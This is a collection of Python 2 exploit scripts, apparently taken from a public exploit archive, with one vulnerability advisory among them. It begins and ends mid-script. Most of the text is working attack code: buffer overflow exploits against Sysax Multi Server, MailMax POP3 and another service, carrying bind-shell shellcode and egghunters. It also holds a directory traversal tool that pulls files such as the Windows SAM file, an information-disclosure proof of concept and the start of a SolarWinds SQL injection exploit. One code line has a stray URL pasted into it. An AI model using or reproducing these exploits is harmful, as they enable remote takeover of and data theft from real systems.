"\xbf\xfd\x93\xf3\x19\x7c\xa8\xce\x19\x7e\x37\x1d")

request1_1 =("\x54\x84\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x92\x00\x00\x00"+
"\x03\x3f\xfb\x76\x08\x20\x80\x00\x7f\xe3\x08\x88\x57\x3b\x77\x80"+
"\x01\x00\x00\x00\xc0\xa8\x01\x42\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x30\x58\x39\x30\x00\x63\x88\x77\xfe\xff\xff\xff"+
"\x1b\x3f\xfb\x76\x6a\x31\x41\x73\xb0\x03\x00\x00\xff\xff\x00\x00"+
"\x06\x10\x00\x44\x74\x62\x3a\x20\x43\x6f\x6e\x74\x65\x78\x74\x00\xd8\xc1\x08\x10\xb0\x03\x00\x00\xff\xff\x00\x00\x06\x10\x00\x00"+
"\x80\xfa")

Request2_1=("\x51\x84\x00\x00\x02\x02\x02\x32\x18\x00\x00\x00\xa4\x01\x00\x00"+
"\x00\x00\x00\x00")

Request2_2=("\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x4d\x4c\x4d\x4c\x4d\x44\x4f\x4c\x4f\x44\x4f\x44"+
"\x49\x4c\x49\x44\x49\x4c\x43\x4c\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x01\x10\x00\x00\x1f\x93\xf0\x48\x67\x60\x1e\x00"+
"\xd1\xc4\x4f\x00")

def connectToTarget(hostname,port):
    newsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        newsock.connect((hostname,port))
    except socket.error, (value,msg):
        if newsock:
          newsock.close()
        print "[x] Error: %s.\n" % msg
        sys.exit(1)http://www.insight-tech.org/xploits/yosemiteStackOverflowExploit.zip
    else:
        print "[x] 0wn3d!"
    buff = ""
    comm = ""
    #newsock.send("\n\n")
    bol = 1
    while bol:
        buff = ""
        comm = ""
        comm = raw_input("$ ")
        if comm == 'Q':
            bol = 0
        elif comm == '':
            comm = ""
        else:
            newsock.send(comm+"\n")
            buff = newsock.recv(20024)
            print buff

if len(sys.argv) != 3:
    print "[x] Usage: IP OS\n[x] OS: W/L\n"
    sys.exit
    
hostname = sys.argv[1]
osver = sys.argv[2]

exploitType = 0

if osver == 'W':
    exploitType=0
elif osver=='L':
    exploitType=1
else:
    print "[x] OS not supported.\n"
    sys.exit

#CALL EDI - 0xB7DA6C90 - Slackware 12.0
ret = "\x90\x6C\xDA\xB7"
#WEEEEEEEEEEEEE - 0x0809c514 - Slackware 12.0
edi = "\x14\xc5\x09\x08"

if(exploitType == 1):
    buff3r = ("\x90"*77) + shellcode + ("\x90"*119) + edi + ret
else:
    buff3r = "A"*500

logno = Request2_1 + buff3r + Request2_2

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
   s.connect((hostname,3817))
except socket.error, (value,msg):
   if s:
    s.close()
   print "[x] Error: %s.\n" % msg
   sys.exit(1)
else:
    print "[x] Connected to: %s." % hostname

    print "[x] Sending initial request.."
try:
    s.send(request1_1)
except socket.error, (value,msg):
    if s:
         s.close()
    print "[x] Error: %s.\n" % msg
    sys.exit(1)
else:
    print "[x] Sent!"

print "[x] Sending Evil Buffer.."

try:
    s.send(logno)
except socket.error, (value,msg):
    if s:
        s.close()
    print "[x] Error: %s.\n" % msg
    sys.exit(1)
else:
    print "[x] Sent!"

if exploitType==1:
    print "[x] Checking if exploit worked.."
    connectToTarget(hostname,4444)

print "[x] End of Demo exploit."
#!/usr/bin/python
##########################################################################################################
#Title: Sysax Multi Server 5.53 SFTP Post Auth SEH Exploit (Egghunter)
#Author: Craig Freyman (@cd1zz)
#Tested on: XP SP3 32bit 
#Software Versions Tested: 5.53
#Date Discovered: Febrary 22, 2012
#Vendor Contacted: Febrary 23, 2012
#Vendor Response: February 27, 2012
#Vendor Fix: Version 5.55
#Notes: Offset based on home path length. This exploit works for C:\AAAAAAAAAAAAAAAA
#Complete Description: http://www.pwnag3.com/2012/02/sysax-multi-server-553-sftp-exploit.html
##########################################################################################################
import paramiko,os,sys

if len(sys.argv) != 5:
    print "[+] Usage: ./filename <Target IP> <Port> <User> <Password>"
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
username = sys.argv[3]
password = sys.argv[4]

transport = paramiko.Transport((host, port))
transport.connect(username = username, password = password)
sftp = paramiko.SFTPClient.from_transport(transport)

# msfvenom -p windows/shell_bind_tcp LPORT=4444 -b "\x00" -e x86/shikata_ga_nai
shell = ("DNWPDNWP"
"\xdb\xd9\xba\xf9\x77\x28\x1b\xd9\x74\x24\xf4\x5e\x29\xc9"
"\xb1\x56\x31\x56\x18\x83\xee\xfc\x03\x56\xed\x95\xdd\xe7"
"\xe5\xd3\x1e\x18\xf5\x83\x97\xfd\xc4\x91\xcc\x76\x74\x26"
"\x86\xdb\x74\xcd\xca\xcf\x0f\xa3\xc2\xe0\xb8\x0e\x35\xce"
"\x39\xbf\xf9\x9c\xf9\xa1\x85\xde\x2d\x02\xb7\x10\x20\x43"
"\xf0\x4d\xca\x11\xa9\x1a\x78\x86\xde\x5f\x40\xa7\x30\xd4"
"\xf8\xdf\x35\x2b\x8c\x55\x37\x7c\x3c\xe1\x7f\x64\x37\xad"
"\x5f\x95\x94\xad\x9c\xdc\x91\x06\x56\xdf\x73\x57\x97\xd1"
"\xbb\x34\xa6\xdd\x36\x44\xee\xda\xa8\x33\x04\x19\x55\x44"
"\xdf\x63\x81\xc1\xc2\xc4\x42\x71\x27\xf4\x87\xe4\xac\xfa"
"\x6c\x62\xea\x1e\x73\xa7\x80\x1b\xf8\x46\x47\xaa\xba\x6c"
"\x43\xf6\x19\x0c\xd2\x52\xcc\x31\x04\x3a\xb1\x97\x4e\xa9"
"\xa6\xae\x0c\xa6\x0b\x9d\xae\x36\x03\x96\xdd\x04\x8c\x0c"
"\x4a\x25\x45\x8b\x8d\x4a\x7c\x6b\x01\xb5\x7e\x8c\x0b\x72"
"\x2a\xdc\x23\x53\x52\xb7\xb3\x5c\x87\x18\xe4\xf2\x77\xd9"
"\x54\xb3\x27\xb1\xbe\x3c\x18\xa1\xc0\x96\x2f\xe5\x0e\xc2"
"\x7c\x82\x72\xf4\x93\x0e\xfa\x12\xf9\xbe\xaa\x8d\x95\x7c"
"\x89\x05\x02\x7e\xfb\x39\x9b\xe8\xb3\x57\x1b\x16\x44\x72"
"\x08\xbb\xec\x15\xda\xd7\x28\x07\xdd\xfd\x18\x4e\xe6\x96"
"\xd3\x3e\xa5\x07\xe3\x6a\x5d\xab\x76\xf1\x9d\xa2\x6a\xae"
"\xca\xe3\x5d\xa7\x9e\x19\xc7\x11\xbc\xe3\x91\x5a\x04\x38"
"\x62\x64\x85\xcd\xde\x42\x95\x0b\xde\xce\xc1\xc3\x89\x98"
"\xbf\xa5\x63\x6b\x69\x7c\xdf\x25\xfd\xf9\x13\xf6\x7b\x06"
"\x7e\x80\x63\xb7\xd7\xd5\x9c\x78\xb0\xd1\xe5\x64\x20\x1d"
"\x3c\x2d\x50\x54\x1c\x04\xf9\x31\xf5\x14\x64\xc2\x20\x5a"
"\x91\x41\xc0\x23\x66\x59\xa1\x26\x22\xdd\x5a\x5b\x3b\x88"
"\x5c\xc8\x3c\x99")

egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
"\x2e\x3c\x05\x5a\x74\xef\xb8\x44\x4e\x57\x50"
"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

nseh = "\x90\x90\xeb\x08"
junk = "A" * 256
padding = "B" * (256 -len(junk) - len(shell))
seh = "\xA1\x47\x92\x5D" #5D9247A1 PPR RPCNS4.dll: *** SafeSEH unprotected ***
remotepath = junk + nseh + seh + "\x90" * 10 + egghunter + "\x90" * 1000 + shell + "\x90" * 100
localpath = '/tmp/system.log'
print "============================================================================"
print "        Sysax Multi Server <= 5.53 SFTP Post Auth SEH Exploit (Egghunter)   "
print "                                  by cd1zz                                  "
print "                               www.pwnag3.com                               "
print "        Launching exploit against " + host + " on port " + str(port) + " for XP"
print "============================================================================"
sftp.get(remotepath, localpath)
sftp.close()
transport.close()
#!/usr/bin/python
##########################################################################################################
#Title: Sysax <= 5.53 SSH Username BoF Pre Auth RCE (Egghunter)
#Author: Craig Freyman (@cd1zz)
#OS Tested: XP SP3 32bit, 2003 Server SP2 (No DEP)
#Software Versions Tested: 5.53, 5.52, 5.50
#Date Discovered: Febrary 22, 2012
#Vendor Contacted: Febrary 23, 2012
#Vendor Response: February 27, 2012
#Vendor Fix: Sysax 5.55
#Detailed Exploit Description:http://www.pwnag3.com/2012/02/sysax-multi-server-ssh-username-exploit.html
##########################################################################################################
import paramiko,os,sys
if len(sys.argv) != 3:
    print "[+] Usage: ./filename <Target IP> <Port>"
    sys.exit(1)
host = sys.argv[1]
port = int(sys.argv[2])
egghunter = (
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05"
"\x5a\x74\xef\xb8\x44\x4e\x57\x50\x8b\xfa\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")
# msfpayload  windows/shell_bind_tcp LPORT=4444 R | msfencode -e -e x86/alpha_mixed X
shell = ("DNWPDNWP"
"\x89\xe0\xda\xdf\xd9\x70\xf4\x5b\x53\x59\x49\x49\x49\x49" 
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" 
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" 
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" 
"\x42\x75\x4a\x49\x69\x6c\x68\x68\x6d\x59\x77\x70\x57\x70" 
"\x57\x70\x33\x50\x4f\x79\x39\x75\x70\x31\x7a\x72\x62\x44" 
"\x4c\x4b\x52\x72\x70\x30\x6e\x6b\x32\x72\x44\x4c\x4c\x4b" 
"\x36\x32\x74\x54\x6e\x6b\x71\x62\x34\x68\x64\x4f\x78\x37" 
"\x42\x6a\x76\x46\x54\x71\x39\x6f\x35\x61\x49\x50\x4e\x4c" 
"\x77\x4c\x61\x71\x31\x6c\x66\x62\x64\x6c\x75\x70\x39\x51" 
"\x58\x4f\x34\x4d\x66\x61\x4f\x37\x6b\x52\x6c\x30\x73\x62" 
"\x30\x57\x4c\x4b\x36\x32\x64\x50\x4c\x4b\x63\x72\x77\x4c" 
"\x57\x71\x7a\x70\x6e\x6b\x61\x50\x72\x58\x6f\x75\x79\x50" 
"\x61\x64\x50\x4a\x63\x31\x48\x50\x30\x50\x4c\x4b\x53\x78" 
"\x56\x78\x6e\x6b\x50\x58\x51\x30\x35\x51\x59\x43\x69\x73" 
"\x57\x4c\x73\x79\x4c\x4b\x47\x44\x6e\x6b\x47\x71\x79\x46" 
"\x44\x71\x4b\x4f\x35\x61\x79\x50\x6c\x6c\x39\x51\x5a\x6f" 
"\x76\x6d\x47\x71\x78\x47\x75\x68\x6b\x50\x33\x45\x39\x64" 
"\x64\x43\x73\x4d\x4c\x38\x37\x4b\x31\x6d\x45\x74\x64\x35" 
"\x39\x72\x32\x78\x4c\x4b\x30\x58\x45\x74\x47\x71\x48\x53" 
"\x50\x66\x4c\x4b\x36\x6c\x42\x6b\x4e\x6b\x56\x38\x75\x4c" 
"\x47\x71\x39\x43\x4e\x6b\x56\x64\x4e\x6b\x33\x31\x68\x50" 
"\x6b\x39\x70\x44\x76\x44\x77\x54\x43\x6b\x71\x4b\x35\x31" 
"\x36\x39\x30\x5a\x30\x51\x4b\x4f\x4d\x30\x70\x58\x31\x4f" 
"\x42\x7a\x4c\x4b\x55\x42\x6a\x4b\x4d\x56\x63\x6d\x70\x68" 
"\x50\x33\x36\x52\x45\x50\x67\x70\x70\x68\x31\x67\x31\x63" 
"\x45\x62\x71\x4f\x31\x44\x61\x78\x52\x6c\x62\x57\x51\x36" 
"\x53\x37\x59\x6f\x4b\x65\x6f\x48\x6e\x70\x56\x61\x67\x70" 
"\x77\x70\x76\x49\x68\x44\x43\x64\x50\x50\x73\x58\x45\x79" 
"\x6b\x30\x32\x4b\x65\x50\x49\x6f\x49\x45\x62\x70\x72\x70" 
"\x76\x30\x70\x50\x53\x70\x66\x30\x67\x30\x46\x30\x45\x38" 
"\x48\x6a\x36\x6f\x39\x4f\x59\x70\x39\x6f\x78\x55\x4e\x69" 
"\x49\x57\x36\x51\x6b\x6b\x52\x73\x50\x68\x56\x62\x77\x70" 
"\x66\x71\x31\x4c\x4f\x79\x6b\x56\x51\x7a\x36\x70\x72\x76" 
"\x32\x77\x65\x38\x4b\x72\x6b\x6b\x64\x77\x71\x77\x4b\x4f" 
"\x4e\x35\x50\x53\x56\x37\x73\x58\x6c\x77\x38\x69\x37\x48" 
"\x69\x6f\x39\x6f\x78\x55\x63\x63\x30\x53\x31\x47\x62\x48" 
"\x30\x74\x78\x6c\x57\x4b\x79\x71\x6b\x4f\x79\x45\x76\x37" 
"\x4c\x49\x6f\x37\x55\x38\x73\x45\x72\x4e\x50\x4d\x43\x51" 
"\x39\x6f\x59\x45\x73\x58\x42\x43\x50\x6d\x43\x54\x75\x50" 
"\x4d\x59\x59\x73\x70\x57\x30\x57\x73\x67\x36\x51\x38\x76" 
"\x51\x7a\x57\x62\x42\x79\x36\x36\x5a\x42\x6b\x4d\x31\x76" 
"\x49\x57\x61\x54\x47\x54\x37\x4c\x67\x71\x53\x31\x4c\x4d" 
"\x67\x34\x77\x54\x74\x50\x7a\x66\x37\x70\x51\x54\x52\x74" 
"\x52\x70\x71\x46\x70\x56\x43\x66\x32\x66\x50\x56\x42\x6e" 
"\x50\x56\x46\x36\x61\x43\x43\x66\x53\x58\x73\x49\x58\x4c" 
"\x37\x4f\x4d\x56\x4b\x4f\x78\x55\x6f\x79\x69\x70\x30\x4e" 
"\x50\x56\x51\x56\x39\x6f\x76\x50\x61\x78\x63\x38\x4e\x67" 
"\x67\x6d\x71\x70\x59\x6f\x49\x45\x6d\x6b\x68\x70\x4f\x45" 
"\x4e\x42\x62\x76\x72\x48\x4c\x66\x4e\x75\x6d\x6d\x6d\x4d" 
"\x6b\x4f\x6a\x75\x37\x4c\x63\x36\x63\x4c\x45\x5a\x6f\x70" 
"\x39\x6b\x39\x70\x52\x55\x37\x75\x6d\x6b\x63\x77\x75\x43" 
"\x74\x32\x72\x4f\x51\x7a\x77\x70\x50\x53\x69\x6f\x38\x55" 
"\x41\x41")
padding1 = "\x90" * 50
padding2 = "\x90" * 50
nseh = "\x90\x90\xeb\x80"	
seh =  "\x69\x26\x40\x00"	#00402669 PPR sysaxservd.exe
junk = "A" * (9204 - len(egghunter + padding1 + padding2 + shell))
buff = junk + shell + padding1 + egghunter + padding2 + nseh + seh
print "============================================================================"
print "                 Sysax <= 5.53 SSH Username BoF Pre Auth RCE                "
print "                                  by cd1zz                                  "
print "                               www.pwnag3.com                               "
print "============================================================================"
try:
	transport = paramiko.Transport((host, port))	
except:
	print "[X] Unable to connect to " + host + " on port " + str(port)
	sys.exit(1)
transport = paramiko.Transport((host, port))
print "[+] Launching exploit against " + host + " on port " + str(port)
print "[+] Done!"
transport.connect(username = buff, password = "pwnag3")	
transport.close()

##############################################################################
#
# Title    : Netmechanica NetDecision Dashboard Server Information Disclosure 
#            Vulnerability
# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
# Vendor   : http://www.netmechanica.com
# Advisory : http://secpod.org/blog/?p=478
#            http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_Vuln.txt
#	     http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py
# Software : Netmechanica NetDecision Dashboard Server version 1.0
# Date     : 05/12/2011
#
###############################################################################

SecPod ID: 1038     				05/12/2011 Issue Discovered
						21/02/2012 Vendor Notified
						22/02/2012 Vendor Acknowledge
						24/02/2012 Issue Resolved


Class: Information Disclosure			Severity: Medium


Overview:
---------
Netmechanica NetDecision 4.5.1 Dashboard Server version 1.0 is prone to 
information disclosure vulnerability.


Technical Description:
----------------------
The vulnerability is caused due to improper validation of malicious HTTP 
request to Dashboard server appended with '?' character, which discloses the 
Dashboard server's web script physical path.


Impact:
--------
Successful exploitation could allow an attacker to cause disclosure of 
sensitive information.


Affected Software:
------------------
Netmechanica NetDecision 4.5.1 (full package) containing Dashboard Server 
version 1.0


Tested on:
-----------
Netmechanica NetDecision 4.5.1 (full package) containing Dashboard Server 
version 1.0 on Windows XP SP3 & Win XP2. Older versions might be affected.


References:
-----------
http://secpod.org/blog/?p=478
http://www.netmechanica.com/downloads
http://www.netmechanica.com/news/?news_id=26
http://www.netmechanica.com/netdecision_dashboard


Proof of Concept:
----------------
http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py


Vendor URL:
----------------
http://www.netmechanica.com
http://www.netmechanica.com/news/?news_id=26


Solution:
----------
Upgrade to NetDecision 4.6.1


Risk Factor:
-------------
CVSS Score Report:
        ACCESS_VECTOR          = NETWORK
        ACCESS_COMPLEXITY      = LOW
        AUTHENTICATION         = NOT_REQUIRED
        CONFIDENTIALITY_IMPACT = PARTIAL
        INTEGRITY_IMPACT       = NONE
        AVAILABILITY_IMPACT    = NONE
        EXPLOITABILITY         = PROOF_OF_CONCEPT
        REMEDIATION_LEVEL      = UNAVAILABLE
        REPORT_CONFIDENCE      = CONFIRMED
        CVSS Base Score        = 5 (AV:N/AC:L/Au:N/C:P/I:N/A:N)
        Risk factor            = Medium

Credits:
--------
Prabhu S Angadi of SecPod Technologies has been credited with the discovery of this
vulnerability.


#!/usr/bin/python
##############################################################################
#
# Title    : Netmechanica NetDecision Dashboard Server Information Disclosure 
#            Vulnerability
# Author   : Prabhu S Angadi SecPod Technologies (www.secpod.com)
# Vendor   : http://www.netmechanica.com
# Advisory : http://secpod.org/blog/?p=478
#            http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_Vuln.txt
#	     http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py
# Software : Netmechanica NetDecision Dashboard Server version 1.0
# Date     : 05/12/2011
#
###############################################################################

import socket,sys,time


if len(sys.argv) < 2:
        print "\t[-] Usage: python SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py target_ip"
        print "\t[-] Example : python SecPod_Netmechanica_NetDecision_Dashboard_Server_Info_Disc_PoC.py 127.0.0.1"
        print "\t[-] Exiting..."
        sys.exit(0)

port   = 8090
target = sys.argv[1]

try:
    socket.inet_aton(target)
except socket.error:
    print "Invalid IP address found ..."
    sys.exit(1)

try:
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((target,port))
    time.sleep(1)
except:
    print "socket() failed"
    sys.exit(1)

exploit = "GET " + "/?" + "HTTP/1.0 "+ "\r\n\r\n"
print "HTTP GET request with '?' filename triggers the vulnerability"

data = exploit
sock.sendto(data, (target, port))
res = sock.recv(1024)
sock.close()

if res.find('file: ') != -1 :
    print "[+] Full Path of the web script directory of DashBoard Server is ....\r\n"
    print res.split('file: ')[1]
else:
    print "[+] Did not get the source path ..."

sys.exit(1)
#!/usr/bin/python

# MailMax <=v4.6 POP3 "USER" Remote Buffer Overflow Exploit (No Login Needed)
# Newer version's not tested, maybe vulnerable too
# A hard one this, the shellcode MUST be lowercase. Plus there are many opcode's that break 
# the payload and opcodes that gets changed, like "\xc3" gets converted to "\xe3", and "\xd3" gets converted to "\xf3"
# written by localh0t
# Date: 29/03/12
# Contact: mattdch0@gmail.com
# Follow: @mattdch
# www.localh0t.com.ar
# Tested on: Windows XP SP3 Spanish (No DEP)
# Targets: Windows (All) (DEP Disabled)
# Shellcode: Bindshell on port 4444 (Change as you wish) (Lowercase Only, use EBX as baseaddr)

from socket import *
import sys, struct, os, time

if (len(sys.argv) < 3):
	print "\nMailMax <=v4.6 POP3 \"USER\" Remote Buffer Overflow Exploit (No Login Needed)"
        print "\n	Usage: %s <host> <port> \n" %(sys.argv[0])
	sys.exit()

print "\n[!] Connecting to %s ..." %(sys.argv[1])

# connect to host
sock = socket(AF_INET,SOCK_STREAM)
sock.connect((sys.argv[1],int(sys.argv[2])))
sock.recv(1024)
time.sleep(5)

buffer = "USER "
buffer += "A" * 1439 # padding
buffer += "\xEB\x06\x90\x90" # Short jmp (6 bytes)
buffer += "\x86\xb3\x02\x10" # pop | pop | ret 1c , dbmax2.dll
buffer += "\x90" * 8 # nops (just to be sure)

# popad's, so esp => shellcode
buffer += "\x61" * 145
# nop's to align
buffer += "\x90" * 11
# and ebx,esp
buffer += "\x21\xe3" 
# or ebx,esp
buffer += "\x09\xe3" 
# at this point, ebx = esp. The shellcode is lowercase (with numbers), baseaddr = EBX
buffer += ("j314d34djq34djk34d1431s11s7j314d34dj234dkms502ds5o0d35upj0204c40jxo2925k3fjeok95718gk20bn8434k6dmcoej2jc3b0164k82bn9455x3bl153l87g7143n3jgox41l81f31lgox5eog2dm8k5831d345f1kj9nb0491j0959ekx4c89557818332e7g828ko45xn94dn32dm2915kkgo385132e8g15mk34k2347koe0b2x0b3xlf3docn8kfj0428f591b3ck33530n0o16eo93191942kl53fnbn8o3jk1k907xjc085eo89k4b1f6dj145l4949k1338931e4bo3lkox415g2ko03e6c44943g83jg3169k02dm0nf382gn3n9j9l18433410k3cn29e70kk0e2cjcn94k91k1mxm9310839kf34mg0d0k846eoe8kmc7gj843nemkn1ld234323l9787f623f3f6199823kox0xok492890nclkn3895510j2je945982745c6c981e954g748enx7dlfl419k01914745b08og8ej03xkcj3540b4045k481jg834872lk3gm420jd241e5fkc4co8729948k0md98o27b625e893b6co54f426c3d9k8c7kn853905e48kf699d7f22oe6xn02gjx00jc188g58l4k5mf850e7e9479l8086bjd09lxnb70384d0e8elfoc938k3cm3j27cm335403b794f9b6el")

buffer += "\x90" * 2000
buffer += "\r\n"
print "[!] Sending exploit..."
sock.send(buffer)
sock.close()
print "[!] Exploit succeed. Now netcat %s on port 4444\n" %(sys.argv[1])
sys.exit()#!/usr/bin/python
##########################################################################################################
#Title: Sysax Multi Server <= 5.57 Directory Traversal Tool (Post Auth)
#Author: Craig Freyman (@cd1zz)
#Tested on: XP SP3 32bit and Server 2003 SP2 32bit
#Date Discovered: March 27, 2012
#Vendor Contacted: March 29, 2012
#Vendor Response: April 3, 2012	
#Vendor Fixed: (Currently working on fix, check my site for update)
#Details: http://www.pwnag3.com/2012/04/sysax-directory-traversal-exploit.html
##########################################################################################################

import socket,sys,time,re,base64,urllib

def main():
	#base64 encode the provided creds
	creds = base64.encodestring(user+"\x0a"+password)

	print "\n"
	print "****************************************************************************"
	print "       Sysax Multi Server <= 5.57 Directory Traversal Tool (Post Auth)      "
	print "     	  	         by @cd1zz www.pwnag3.com                          "
	print "	        Getting "+getfile+" from " + target + " on port " + str(port) 
	print "****************************************************************************"

	#setup post for login
	login = "POST /scgi?sid=0&pid=dologin HTTP/1.1\r\n"
	login += "Host: \r\n"
	login += "http://"+target+"/scgi?sid=0&pid=dologin\r\n"
	login += "Content-Type: application/x-www-form-urlencoded\r\n"
	login += "Content-Length: 15\r\n\r\n"
	login += "fd="+creds+"\n\n"

	#send post and login creds
	try:
		r = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		r.connect((target, port))
		print "[*] Logging in"
		r.send(login)
	except Exception, e:
		print "[-] Could not login"
		print e
	
	#loop the recv sock so we get the full page
	page = ''	
	fullpage = ''	
	while "</html>" not in fullpage:
		page = r.recv(4096)
		fullpage += page
	time.sleep(1)

	#regex the sid from the page
	global sid
	sid = re.search(r'sid=[a-zA-Z0-9]{40}',fullpage,re.M)
	if sid is None:
		print "[x] Could not login. User and pass correct?"
		sys.exit(1)
	time.sleep(1)

	#regex to find user's path
	print "[*] Finding your home path"
	global path
	path = re.search(r'file=[a-zA-Z]:\\[\\.a-zA-Z_0-9 ]{1,255}[\\$]',fullpage,re.M)
	time.sleep(1)

	#if that doesn't work, try to upload a file and check again
	if path is None:
		print "[-] No files found, I will try to upload one for you."
		print "[-] If you don't have rights to do this, it will fail."

		upload = "POST /scgi?"+str(sid.group(0))+"&pid=uploadfile_name1.htm HTTP/1.1\r\n"
		upload += "Host:\r\n"
		upload += "Content-Type: multipart/form-data; boundary=---------------------------97336096252362005297691620\r\n"
		upload += "Content-Length: 219\r\n\r\n"
		upload += "-----------------------------97336096252362005297691620\r\n"
		upload += "Content-Disposition: form-data; name=\"upload_file\"; filename=\"file.txt\"\r\n"
		upload += "Content-Type: text/plain\r\n"
		upload += "-----------------------------97336096252362005297691620--\r\n\r\n"

		u = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		u.connect((target, port))
		u.send(upload + "\r\n")
		page = ''
		fullpage = ''	
		while "</html>" not in fullpage:
			page = u.recv(4096)
			fullpage += page
		path = re.search(r'file=[a-zA-Z0-9]:\\[\\.a-zA-Z_0-9 ]{1,255}[\\$]',fullpage,re.M)
		time.sleep(2)
		if path is None:
			print "\n[x] It failed, you probably don't have rights to upload."
			print "[x] Please retry the script a few times."
			print "[x] You need at least one file in the directory because we need" 
			print "[x] to append our directory traversal to the end of your path."
			sys.exit(1)
	print "[+] Got it => " + path.group(0) 
	time.sleep(1)
	r.close()

def dirtrav():
	#here is the dir trav 
	url = "http://"+target+"/scgi?"+str(sid.group(0))+"&"+path.group(0)+"../../../../../../../"+getfile
	try:
		retrieved_file = urllib.urlopen(url)
		filename = raw_input("[+] Got your file. What file name do you want to save it as?  ")
		output = open(filename,'wb')
		output.write(retrieved_file.read())
		output.close()
		print "[*] Done!"
	except Exception, e:
		print "[x] Either the file doesn't exist or you mistyped it. Error below:"
		print "[x] You can also try to browse this site manually:"
		print "[x] " + url
		print e

def keepgoing():
	cont = raw_input("[*] Do you want another file (y/n)? ")
	while cont == "y":
		global getfile
		getfile = raw_input("[*] Enter the location of the new file: ")
		dirtrav()
		cont = raw_input("[*] Do you want another file (y/n)? ")
	else:
		sys.exit(1) 
	
if __name__ == '__main__':
	if len(sys.argv) != 6:
		print "[+] Usage: ./filename <Target IP> <Port> <User> <Password> <File>"
		print "[+] File examples => windows/repair/sam or boot.ini"
		sys.exit(1)

	target, port, user, password, getfile = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5]
	
	main()
	dirtrav()
	keepgoing()
#!/usr/bin/python
######################################################################################
# Exploit Title: Solarwinds Storage Manager 5.1.0 Remote SYSTEM SQL Injection Exploit
# Date: May 2nd 2012
# Author: muts
# Version: SolarWinds Storage Manager 5.1.0
# Tested on: Windows 2003
# Archive Url : http://www.offensive-security.com/0day/solarshell.txt
######################################################################################
# Discovered by Digital Defence - DDIVRT-2011-39
######################################################################################


import urllib, urllib2, cookielib
import sys
import random

print "\n[*] Solarwinds Storage Manager 5.1.0 Remote SYSTEM SQL Injection Exploit"
print "[*] Vulnerability discovered by Digital Defence - DDIVRT-2011-39"

print "[*] Offensive Security - http://www.offensive-security.com\n"
if (len(sys.argv) != 4):
	print "[*] Usage: solarshell.py <RHOST> <LHOST> <LPORT>"
	exit(0)

rhost = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]

filename = ''
for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',6):
	filename+=i
filename +=".jsp"

